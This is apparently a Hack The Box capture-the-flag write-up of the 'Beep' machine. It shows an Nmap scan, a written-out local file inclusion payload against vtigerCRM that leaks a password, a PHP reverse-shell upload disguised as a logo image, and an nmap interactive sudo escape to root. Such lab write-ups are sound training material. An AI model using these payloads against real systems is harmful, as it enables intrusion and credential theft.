---
"title": "Hack The Box - Beep"
"date": 2019-12-01
"tags": ["linux", "easy", "setuid", "cve", "lfi", "file-upload-vuln"]
"keywords": ["linux", "easy", "setuid", "cve", "lfi", "file-upload-vuln"]
"categories": ["HackTheBox OSCP-Like"]
"author": "Ghostbyt3"
"description": "We are going to pwn Beep from Hack The Box."
"featured_image": "/img/htb-beep/1.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox OSCP-Like - Writeup"
---


![Untitled](/img/htb-beep/1.png)

We are going to pwn Beep from Hack The Box.

Link : [https://www.hackthebox.eu/home/machines/profile/5](https://www.hackthebox.eu/home/machines/profile/5)


Lets Begin with our Initial Nmap Scan.

## Nmap Scan Results
```bash
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
878/tcp   open  unknown
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4190/tcp  open  sieve
4445/tcp  open  upnotifyp
4559/tcp  open  hylafax
5038/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt


22/tcp    open   ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|media device|PBX|WAP|printer|specialized
Running (JUST GUESSING): Linux 2.6.X|2.4.X (95%), Linksys embedded (95%), Osmosys embedded (94%), HP embedded (94%), Enterasys embedded (94%), Riverbed RiOS (93%), Gemtek embedded (93%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:2.6.27 cpe:/o:linux:linux_kernel:2.6.18 cpe:/h:linksys:wrv54g cpe:/o:linux:linux_kernel:2.4.32 cpe:/h:enterasys:ap3620 cpe:/o:riverbed:rios cpe:/h:gemtek:p360
Aggressive OS guesses: Linux 2.6.9 - 2.6.30 (95%), Linux 2.6.27 (likely embedded) (95%), Linux 2.6.18 (95%), Linux 2.6.20-1 (Fedora Core 5) (95%), Linux 2.6.30 (95%), Linux 2.6.5 (Fedora Core 2) (95%), Linux 2.6.5 - 2.6.12 (95%), Elastix PBX (Linux 2.6.18) (95%), Linksys WRV54G WAP (95%), Linux 2.6.27 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host:  beep.localdomain
80/tcp    open   http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open   pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: STLS EXPIRE(NEVER) APOP UIDL RESP-CODES PIPELINING AUTH-RESP-CODE TOP LOGIN-DELAY(0) IMPLEMENTATION(Cyrus POP3 server v2) USER
111/tcp   open   rpcbind    2 (RPC #100000)
143/tcp   open   imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: ANNOTATEMORE ID ATOMIC OK LISTEXT URLAUTHA0001 Completed QUOTA IMAP4rev1 LIST-SUBSCRIBED SORT LITERAL+ X-NETSCAPE RIGHTS=kxte MAILBOX-REFERRALS CONDSTORE IMAP4 UIDPLUS IDLE SORT=MODSEQ MULTIAPPEND THREAD=ORDEREDSUBJECT THREAD=REFERENCES UNSELECT CHILDREN BINARY STARTTLS NAMESPACE NO RENAME ACL CATENATE
443/tcp   open   ssl/https?
|_ssl-date: 2019-12-01T13:40:51+00:00; +1h00m15s from scanner time.
878/tcp   open   status     1 (RPC #100024)
993/tcp   open   ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open   pop3       Cyrus pop3d
3306/tcp  open   mysql      MySQL (unauthorized)
4190/tcp  open   sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open   upnotifyp?
4559/tcp  open   hylafax    HylaFAX 4.3.10
5038/tcp  open   asterisk   Asterisk Call Manager 1.1
10000/tcp open   http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/1%OT=22%CT=5%CU=35487%PV=Y%DS=2%DC=T%G=Y%TM=5DE3B55
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=CC%GCD=1%ISR=CC%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11N
OS:W7%O6=M54DST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R
OS:=Y%DF=Y%T=40%W=16D0%O=M54DNNSNW7%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M54DST11NW7%RD=0%
OS:Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%
OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%
OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIP
OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

## HTTP Enumeration

While checking the webpage , it is an ``Elastix Login page``[br/](br/)
![Untitled](/img/htb-beep/2.png)

So I searched in Searchsploit but there is more exploit and I cant find any version of it in the webpage 
![Untitled](/img/htb-beep/3.png)

Lets start randomly and this one looks interesting 

> https://www.exploit-db.com/exploits/37637


``` /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action ```

This is an LFI exploit and it worked!
![Untitled](/img/htb-beep/4.png)

And I found some credentials

![Untitled](/img/htb-beep/5.png)

``` admin:jEhdIekWmdjE ```

Using the same LFI let's see ``/etc/password`` and found an user ``fanis``
![Untitled](/img/htb-beep/6.png)

We know the user so I tried to see the user flag
![Untitled](/img/htb-beep/7.png)
And yeah, I got the user flag!!

Now Lets try to log in and see what in ``Elastix``
![Untitled](/img/htb-beep/8.png)
I cant find any vulnerabilities or any loop holes.

## Method 1 of getting Root

I checked if there is any other vulnerability available on other ports and It doesnt look like any so I just tried login with the creds we found from the LFI in ssh ```root:jEhdIekWmdjE```
![Untitled](/img/htb-beep/9.png)

We are root!

## Method 2 (File Upload Vulnerability)

From the LFI I came to know there is another login page ``/vtigercrm`` it is an ``vtigerCRM``
![Untitled](/img/htb-beep/10.png)

I tried login with the same creds we found before ``admin:jEhdIekWmdjE``
![Untitled](/img/htb-beep/11.png)
It looks like they use same creds for all xD

I found we can change the logo so we can try to upload our payload.
It is in Settings -> Company Details
![Untitled](/img/htb-beep/12.png)

I uploaded my reverse shell as ``shell.php.jpg`` and intercept it with burp and then change the extension back to ``shell.php``

![Untitled](/img/htb-beep/13.png)

I changed the extension to ``.php`` and forwarded. 

![Untitled](/img/htb-beep/14.png)

I check the source code to see the location of the logo.

![Untitled](/img/htb-beep/15.png)
It is in ``/test/logo/``

So listening on my machine, I got the shell[br/](br/)
![Untitled](/img/htb-beep/16.png)

## Privilege Escalation

While checking ``sudo -l``[br/](br/)
![Untitled](/img/htb-beep/17.png)

User ``asterisk`` can run these without root permission so i chose ``nmap`` from this.

I searched in GTFOBins

>[https://gtfobins.github.io/gtfobins/nmap/](https://gtfobins.github.io/gtfobins/nmap/)

So I tried it

```
nmap --interactive
nmap> !sh
```
![Untitled](/img/htb-beep/18.png)

I'm Root now!


